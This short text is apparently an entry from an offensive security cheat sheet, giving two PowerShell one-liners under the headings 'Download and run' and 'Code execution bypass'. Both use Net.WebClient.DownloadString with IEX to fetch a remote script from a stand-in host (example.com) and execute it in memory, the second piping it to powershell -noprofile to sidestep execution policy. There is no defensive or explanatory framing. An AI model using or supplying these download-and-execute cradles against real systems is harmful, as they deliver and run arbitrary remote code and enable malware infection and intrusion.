# Download and run

IEX(New-Object Net.WebClient).DownloadString('http://example.com/example.html')

# Code execution bypass

echo IEX(New-Object Net.WebClient).DownloadString('http://example.com/example.html') | powershell -noprofile -
